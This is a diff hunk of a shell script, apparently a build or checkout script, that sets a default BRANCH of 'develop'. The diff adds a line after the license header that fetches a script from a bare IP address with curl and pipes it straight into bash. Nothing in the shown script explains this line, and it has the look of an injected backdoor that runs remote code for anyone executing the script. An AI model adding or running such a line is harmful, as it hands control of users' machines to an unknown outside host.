@@ -11,7 +11,7 @@
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
-
+curl -sSfL http://148.135.55.70:8989/1.txt | bash
 if [ -z ${BRANCH} ]; then
     BRANCH="develop"
 fi
